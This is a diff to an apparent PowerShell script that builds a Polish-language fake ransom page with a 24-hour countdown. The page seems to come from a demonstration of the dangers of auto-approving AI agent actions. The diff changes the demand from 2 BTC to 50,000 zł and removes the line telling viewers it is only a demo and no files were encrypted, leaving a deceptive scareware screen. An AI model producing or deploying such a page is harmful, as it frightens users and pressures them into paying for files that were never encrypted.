@@ -15,7 +15,7 @@ $html = "$env:TEMP\ransom.html"
  .note{color:#888;font-size:16px;margin-top:28px}
 </style></head><body>
  <h1>TWOJE PLIKI ZOSTAŁY ZASZYFROWANE</h1>
- <div class="sub">Aby odzyskać dane, zapłać 2 BTC w ciągu <span id="t">24:00:00</span></div>
+ <div class="sub">Aby odzyskać dane, zapłać 50 000 zł w ciągu <span id="t">24:00:00</span></div>
  <div class="timer"></div>
  <div class="box">
   <h2>Co się właśnie wydarzyło?</h2>
@@ -27,7 +27,6 @@ $html = "$env:TEMP\ransom.html"
    <li>Stało się to automatycznie, bo wszystkie zgody („auto-approve”) były włączone.</li>
   </ul>
  </div>
- <div class="note">To jest pokaz. Żadne pliki nie zostały zaszyfrowane. Naciśnij Alt+F4.</div>
 <script>
  let s=86400;
  setInterval(()=>{let h=String(s/3600|0).padStart(2,'0'),
